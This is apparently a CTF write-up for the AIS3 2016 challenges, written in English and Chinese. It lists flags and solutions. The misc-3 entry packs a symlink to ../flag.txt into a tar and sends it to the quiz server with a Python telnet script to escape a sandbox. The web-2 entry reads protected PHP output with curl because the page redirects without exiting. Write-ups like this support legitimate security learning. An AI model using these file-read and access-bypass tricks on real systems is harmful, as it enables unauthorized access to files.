## misc-1

Open the misc1.txt

The key is `ais3{2016_^_^_hello_world!}`

## misc-2

Hint: 7Zip


## misc-3

Hint: symbolic link (透過 tar 可保留 synblic link)

`ln -s ../flag.txt guess.txt`

`tar cvf guess.tar guess.txt`

`python misc3_sol.py`

Here is the misc3_sol.py code 

``` python
#!/usr/bin/env python3

import telnetlib

data = str.encode(list(open('guess.tar'))[0])
client = telnetlib.Telnet('quiz.ais3.org', 9150)
client.write(str.encode(str(len(data))) + '\n' + data)
print(client.read_all())
```

The key is `ais3{First t1me 1$sc4pe tHE S4nd80x}`

## crypto-1

Hint: XOR

可以透過 [pwntool](https://github.com/hellman/xortool) 破解此題

以下為執行畫面
![crypto1/xortool_sol.png](crypto1/xortool_sol.png)

得到了 `ais3{XoR_enCrYPti0N_15_n0t_a_G00d_i!ea}`

但上傳 key 的時候，發現不正確... ((崩潰 

經過了多次修改，得到了最後的 key

The key is `ais3{XoR_enCrYPti0N_15_n0t_a_G00d_idea}`


## crypto-2


## web-1

開啟 [web1](https://quiz.ais3.org:8011) 看到以下內容

```
There is a secret page in these website. Even Google can not find it, can you?
```

推測是 `robots.txt`，得到了以下資訊

```
User-agent: *
Disallow: /admin
Disallow: /cgi-bin/
Disallow: /images/
Disallow: /tmp/
Disallow: /private/
Disallow: /this_secret_page_you_should_not_know_where_it_is.php
```

開啟 [`https://quiz.ais3.org:8011/this_secret_page_you_should_not_know_where_it_is.php`](https://quiz.ais3.org:8011/this_secret_page_you_should_not_know_where_it_is.php)


The key is `ais3{Y0u_beat_the_G00g1e!!}`


## web-2

開啟 [web2](https://quiz.ais3.org:8012/)

``` php
<?php
error_reporting(0);
include "flag.php";

// Strong IP firewall, no-one can pass this except the admin in localhost
if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1')
{
header("Location: you_should_not_pass");
}
?>

<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Admin Panel</title>
</head>
<body>
Admin's secret is: <?php echo $flag; ?>
</body>
</html>
```

可以看到沒有 `exit` 跟 `die`，因此 body content 還是會輸出

```
WeiYu$ curl https://quiz.ais3.org:8012/

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Admin Panel</title>
</head>
<body>
Admin's secret is: {admin's_pane1_is_on_fir3!!!!!}</body>
</body>
</html>
```

The key is `ais3{admin's_pane1_is_on_fir3!!!!!}`


## web-3



